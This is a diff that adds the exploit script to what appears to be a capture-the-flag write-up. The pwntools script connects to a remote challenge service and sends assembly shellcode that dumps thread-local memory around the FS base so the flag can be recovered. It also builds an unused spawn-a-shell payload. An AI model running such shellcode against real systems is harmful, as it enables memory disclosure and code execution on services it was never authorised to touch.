@@ -64,3 +64,66 @@ If the dump contains `... {CFT ...`, it corresponds to the chunk `volatile __thr
 * Reversed: `TFC{`
 
 We simply parse the dump for printable strings and reverse every 4-byte chunk to assemble the final flag.
+
+## Exploit Script
+Here is the final solution:
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+context.os = 'linux'
+
+io = remote('34.89.163.72', 31829)
+
+shellcode_asm = """
+    /* 1. Get the address of the Thread Control Block (FS Base) */
+    mov rsi, qword ptr fs:[0]
+
+    /* 2. Move back a SAFE amount (0x200 = 512 bytes).
+       0x1000 was likely hitting unmapped memory.
+       The flag is likely right next to the FS base. */
+    sub rsi, 0x200
+
+    /* 3. Dump 0x300 bytes.
+       This reads from [FS-0x200] to [FS+0x100].
+       This range covers the TLS variables (flag) and the TCB itself. */
+    mov rax, 1          /* sys_write */
+    mov rdi, 1          /* stdout */
+    mov rdx, 0x300      /* length */
+    syscall
+
+    /* 4. Exit cleanly */
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+"""
+
+payload_leak_string = asm(shellcode_asm)
+shellcode_asm_sh = shellcraft.sh()
+payload = asm(shellcode_asm_sh)
+
+print(io.recvuntil(b'shellcodez!!!\n').decode())
+
+io.send(payload_leak_string)
+
+output = io.recvall()
+
+print(f"\n[+] Received {len(output)} bytes of dump.")
+
+
+if len(output) > 0:
+    print("\n[+] Hexdump around potential flag area:")
+    print(hexdump(output))
+
+    print("\n[+] Attempting to extract strings:")
+    # Filter for printable strings to help spot the flag
+    import re
+    strings = re.findall(b'[ -~]{4,}', output)
+    for s in strings:
+        print(f"Found string: {s.decode(errors='ignore')}")
+else:
+    print("[-] Still no output. The offset might still be invalid or syscalls are restricted.")
+
+io.close()
+```
